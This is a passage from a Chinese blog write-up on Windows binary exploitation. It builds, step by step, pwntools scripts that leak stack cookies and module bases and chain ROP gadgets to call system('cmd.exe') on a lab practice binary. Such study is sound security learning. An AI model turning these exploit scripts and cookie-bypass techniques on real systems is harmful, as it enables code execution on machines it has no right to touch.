<p>接下来编写常规的 <code>exp</code> 来泄露上面提到的地址</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&quot;192.168.0.104&quot;</span>,<span class="number">6666</span>)</span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x118</span>-<span class="number">0x18</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">stack_cookie=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stack_cookie ==&gt; &#x27;</span>,<span class="built_in">hex</span>(stack_cookie))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x118</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x118</span>)</span><br><span class="line">base_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x12f4</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;base_addr ==&gt; &#x27;</span>,<span class="built_in">hex</span>(base_addr))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x188</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x188</span>)</span><br><span class="line">ntdll_dll=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x526b1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ntdll_dll ==&gt; &#x27;</span>,<span class="built_in">hex</span>(ntdll_dll))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240328131533313.png" alt="image-20240328131533313"></p>
<p>但这么写是错误的，因为程序只有三次输入和输出的机会。这样把三次机会都拿来泄露，可最后没有输入的机会，程序就会直接结束。因此 <code>ntdll.dll</code> 暂时先不泄露，在泄露出程序基地址后，先劫持返回地址重新回到 <code>main</code> 函数。这样又拿到了三次输入和输出的机会，同时需要注意，因为再次回到 <code>main</code> 函数，当前栈帧会改变，<code>rsp</code> 的值改变后会影响 <code>StackCookie</code> 的值，所以第二次到 <code>main</code> 函数时，还需要重新泄露 <code>StackCookie</code></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&quot;192.168.0.104&quot;</span>,<span class="number">6666</span>)</span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x118</span>-<span class="number">0x18</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">stack_cookie=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stack_cookie ==&gt; &#x27;</span>,<span class="built_in">hex</span>(stack_cookie))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x118</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x118</span>)</span><br><span class="line">base_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x12f4</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;base_addr ==&gt; &#x27;</span>,<span class="built_in">hex</span>(base_addr))</span><br><span class="line"></span><br><span class="line">main_addr=base_addr+<span class="number">0x1000</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(stack_cookie)</span><br><span class="line">payload+=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload+=p64(main_addr)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure>



<p>上面的 <code>exp</code> 执行后，经过调试是可以再次回到 <code>main</code> 函数上的。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240328144547951.png" alt="image-20240328144547951"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240328144611047.png" alt="image-20240328144611047"></p>
<p>接下来是泄露新的 <code>StackCookie</code> 和 <code>ntdll.dll</code> 基地址，并且通过 <code>ROP</code> 泄露出 <code>ucrtbase.dll</code> 基地址。<code>exp</code> 如下</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&quot;192.168.0.104&quot;</span>,<span class="number">6666</span>)</span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x118</span>-<span class="number">0x18</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">first_stack_cookie=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;first&gt;&gt; stack_cookie ==&gt; &#x27;</span>,<span class="built_in">hex</span>(first_stack_cookie))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x118</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x118</span>)</span><br><span class="line">base_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x12f4</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;base_addr ==&gt; &#x27;</span>,<span class="built_in">hex</span>(base_addr))</span><br><span class="line"></span><br><span class="line">main_addr=base_addr+<span class="number">0x1000</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(first_stack_cookie)</span><br><span class="line">payload+=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload+=p64(main_addr)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">ntdll.dll</span></span><br><span class="line"><span class="string">0x000000018000137d : pop rbx ; ret</span></span><br><span class="line"><span class="string">0x000000018001a853 : pop rcx ; ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">base</span></span><br><span class="line"><span class="string">00000001400010A6     call    cs:puts</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">second_stack_cookie=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;second&gt;&gt; stack_cookie ==&gt; &#x27;</span>,<span class="built_in">hex</span>(second_stack_cookie))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x180</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x180</span>)</span><br><span class="line">ntdll_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x526b1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ntdll_base ==&gt; &#x27;</span>,<span class="built_in">hex</span>(ntdll_base))</span><br><span class="line"></span><br><span class="line">pop_rbx_ret=<span class="number">0x137d</span>+ntdll_base</span><br><span class="line">pop_rcx_ret=<span class="number">0x1a853</span>+ntdll_base</span><br><span class="line">call_puts=<span class="number">0x10a6</span>+base_addr</span><br><span class="line">puts_got=<span class="number">0x2180</span>+base_addr</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(second_stack_cookie)</span><br><span class="line">payload+=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload+=p64(pop_rbx_ret)</span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(pop_rcx_ret)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(call_puts)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">ucrtbase=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ucrtbase ==&gt; &#x27;</span>,<span class="built_in">hex</span>(ucrtbase))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p>下面是跳转至 <code>ROP</code> 链中的 <code>pop rbx ; ret</code> </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240328154129097.png" alt="image-20240328154129097"></p>
<p>下图是 <code>exp</code> 执行后泄露出了所有地址的情况，并且可以还有一次输入的机会</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240328155055711.png" alt="image-20240328155055711"></p>
<p>现在可以写出如下 <code>exp</code> ，完成 <code>system(&quot;cmd.exe&quot;)</code> 的调用</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&quot;192.168.0.104&quot;</span>,<span class="number">6666</span>)</span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x118</span>-<span class="number">0x18</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">first_stack_cookie=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;first&gt;&gt; stack_cookie ==&gt; &#x27;</span>,<span class="built_in">hex</span>(first_stack_cookie))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x118</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x118</span>)</span><br><span class="line">base_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x12f4</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;base_addr ==&gt; &#x27;</span>,<span class="built_in">hex</span>(base_addr))</span><br><span class="line"></span><br><span class="line">main_addr=base_addr+<span class="number">0x1000</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(first_stack_cookie)</span><br><span class="line">payload+=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload+=p64(main_addr)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">ntdll.dll</span></span><br><span class="line"><span class="string">0x000000018000137d : pop rbx ; ret</span></span><br><span class="line"><span class="string">0x000000018001a853 : pop rcx ; ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">base</span></span><br><span class="line"><span class="string">00000001400010A6     call    cs:puts</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">second_stack_cookie=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;second&gt;&gt; stack_cookie ==&gt; &#x27;</span>,<span class="built_in">hex</span>(second_stack_cookie))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x180</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x180</span>)</span><br><span class="line">ntdll_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x526b1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ntdll_base ==&gt; &#x27;</span>,<span class="built_in">hex</span>(ntdll_base))</span><br><span class="line"></span><br><span class="line">pop_rbx_ret=<span class="number">0x137d</span>+ntdll_base</span><br><span class="line">pop_rcx_ret=<span class="number">0x1a853</span>+ntdll_base</span><br><span class="line">call_puts=<span class="number">0x10a6</span>+base_addr</span><br><span class="line">puts_got=<span class="number">0x2180</span>+base_addr</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(second_stack_cookie)</span><br><span class="line">payload+=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload+=p64(pop_rbx_ret)</span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(pop_rcx_ret)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(call_puts)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">ucrtbase=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x83D50</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ucrtbase ==&gt; &#x27;</span>,<span class="built_in">hex</span>(ucrtbase))</span><br><span class="line"></span><br><span class="line">cmd_addr=ucrtbase+<span class="number">0xD0CB0</span></span><br><span class="line">system_addr=ucrtbase+<span class="number">0xae5c0</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(second_stack_cookie)</span><br><span class="line">payload+=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload+=p64(pop_rcx_ret)</span><br><span class="line">payload+=p64(cmd_addr)</span><br><span class="line">payload+=p64(system_addr)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>执行后发现没有成功调用到 <code>system</code> 函数，经过调试，找到是 <code> __security_check_cookie</code> 函数的检查没过。因为上面执行 <code>call puts</code> 改变了 <code>rsp</code> 的值，所以泄露第二次的 <code>StackCookie</code> 也不能用了。这意味着我们要拿到栈地址和 <code>__security_cookie</code> 的值，后者可以通过 <code>ROP</code> 泄露出来，又因为异或运算，知道三个值中的任意两个都可以求出来第三个，栈地址泄露不出来，但之前已经泄露了 <code>StackCookie</code> 的值，用 <code>StackCookie</code> 和 <code>__security_cookie</code>  进行异或就可以拿到栈地址。</p>
<p>所以第一次 <code>ROP</code> 不能着急泄露 <code>ucrtbase</code> 的值（<strong>但是到这里我想补充一下，就算是打远程，因为模块基地址是固定的，<code>ntdll.dll</code> 和程序基地址其实分别泄露一次就可以了，不需要把脚本写这么长，当然这样写也没啥问题</strong>），而是先泄露出 <code>__security_cookie</code> 的值。然后求出来栈地址，之后每次溢出的时候，都要拿新的 <code>rsp</code> （因为会被上一次 <code>rop</code> 给影响）和 <code>__security_cookie</code> 进行异或，求出最新的 <code>StackCookie</code> 再进行 <code>rop</code></p>
<h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&quot;192.168.0.104&quot;</span>,<span class="number">6666</span>)</span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x118</span>-<span class="number">0x18</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">first_stack_cookie=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;first&gt;&gt; stack_cookie ==&gt; &#x27;</span>,<span class="built_in">hex</span>(first_stack_cookie))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x118</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x118</span>)</span><br><span class="line">base_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x12f4</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;base_addr ==&gt; &#x27;</span>,<span class="built_in">hex</span>(base_addr))</span><br><span class="line"></span><br><span class="line">main_addr=base_addr+<span class="number">0x1000</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(first_stack_cookie)</span><br><span class="line">payload+=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload+=p64(main_addr)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">ntdll.dll</span></span><br><span class="line"><span class="string">0x000000018000137d : pop rbx ; ret</span></span><br><span class="line"><span class="string">0x000000018001a853 : pop rcx ; ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">base</span></span><br><span class="line"><span class="string">00000001400010A6     call    cs:puts</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#==============================================================================</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">second_stack_cookie=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;second&gt;&gt; stack_cookie ==&gt; &#x27;</span>,<span class="built_in">hex</span>(second_stack_cookie))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x180</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x180</span>)</span><br><span class="line">ntdll_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x526b1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ntdll_base ==&gt; &#x27;</span>,<span class="built_in">hex</span>(ntdll_base))</span><br><span class="line"></span><br><span class="line">pop_rbx_ret=<span class="number">0x137d</span>+ntdll_base</span><br><span class="line">pop_rcx_ret=<span class="number">0x1a853</span>+ntdll_base</span><br><span class="line">call_puts=<span class="number">0x10a6</span>+base_addr</span><br><span class="line">puts_got=<span class="number">0x2180</span>+base_addr</span><br><span class="line">cookie_ptr=<span class="number">0x3008</span>+base_addr</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(second_stack_cookie)</span><br><span class="line">payload+=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload+=p64(pop_rbx_ret)</span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(pop_rcx_ret)</span><br><span class="line">payload+=p64(cookie_ptr)</span><br><span class="line">payload+=p64(call_puts)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">cookie=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;cookie ==&gt; &#x27;</span>,<span class="built_in">hex</span>(cookie))</span><br><span class="line">stack_addr=cookie^second_stack_cookie</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stack_addr ==&gt; &#x27;</span>,<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>)</span><br><span class="line">payload+=p64((stack_addr+<span class="number">0x160</span>)^cookie)</span><br><span class="line">payload+=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload+=p64(pop_rbx_ret)</span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(pop_rcx_ret)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(call_puts)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">ucrtbase=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x83D50</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ucrtbase ==&gt; &#x27;</span>,<span class="built_in">hex</span>(ucrtbase))</span><br><span class="line"></span><br><span class="line">cmd_addr=ucrtbase+<span class="number">0xD0CB0</span></span><br><span class="line">system_addr=ucrtbase+<span class="number">0xae5c0</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>)</span><br><span class="line">payload+=p64((stack_addr+<span class="number">0x2c0</span>)^cookie)</span><br><span class="line">payload+=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload+=p64(pop_rcx_ret)</span><br><span class="line">payload+=p64(cmd_addr)</span><br><span class="line">payload+=p64(system_addr)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>补充：有时候不知道为什么计算出 <code>rsp</code> 会错误，导致 <code>StackCookie</code> 求出来时错的，从而触发了 <code>__security_check_cookie</code> 函数，一次没有成功的话就多试几次。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240328171612752.png" alt="image-20240328171612752"></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg5OTcxMDM1NA==&mid=2247483906&idx=1&sn=c198544fb3c781edb8b89f06f7483c59&chksm=c04e6efff739e7e9f72ad443021101e12fe775f86190a844e4420fa16143edb96aa815122582&mpshare=1&scene=23&srcid=0308XeI2W7Nn5oEyLeEo8N14&sharer_shareinfo=5a5e4a83d3a31bced0e2c5cf43b4a5a4&sharer_shareinfo_first=5a5e4a83d3a31bced0e2c5cf43b4a5a4#rd">格式化字符串打出没有回头路（下）——回头望月 (qq.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/189093#h2-0">Windows下漏洞利用——S.E.H深入分析-安全客 - 安全资讯平台 (anquanke.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.z1r0.top/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/#%E5%88%A9%E7%94%A8pwntools%E7%BC%96%E5%86%99exp">win pwn初探（二） (z1r0.top)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/pwnfeifei/p/17162374.html">windows pwn（一） - 狒猩橙 - 博客园 (cnblogs.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11865?time__1311=mqmx0DBD9DyDnDfx4BuQx20Qqmh1=GnieD&alichlgref=https://www.bing.com/#toc-0">win pwn初探（一） - 先知社区 (aliyun.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://gdufs-king.github.io/2020/11/09/Windows-pwn%E5%85%A5%E9%97%A8/">Windows-pwn入门 - V1ct0r的博客 (gdufs-king.github.io)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/188170">Windows-pwn解题原理&amp;利用手法详解-安全客 - 安全资讯平台 (anquanke.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45323960/article/details/131312600">windows pwn 基础知识-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://sky123.blog.csdn.net/article/details/131697469?spm=1001.2014.3001.5502">https://sky123.blog.csdn.net/article/details/131697469?spm=1001.2014.3001.5502</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8531?time__1311=n4+xuDgDBDyDRGDnDGhxBk8oQbHO+QC+CCeD&alichlgref=https://www.google.com/">Windows pwn学习笔记 - 先知社区 (aliyun.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://ret2ver.github.io/2021/10/01/PE32-Advanced-stack-buffer-overflow/">https://ret2ver.github.io/2021/10/01/PE32-Advanced-stack-buffer-overflow/</a>)</p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/windows-pwn/" rel="tag"># windows_pwn</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/posts/976bb1b4.html" rel="prev" title="浅尝Qiling">
                  <i class="fa fa-chevron-left"></i> 浅尝Qiling
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/posts/2ddfe893.html" rel="next" title="不知从哪翻出来的 house of obstack 学习总结">
                  不知从哪翻出来的 house of obstack 学习总结 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">ZIKH26</span>
  </div>
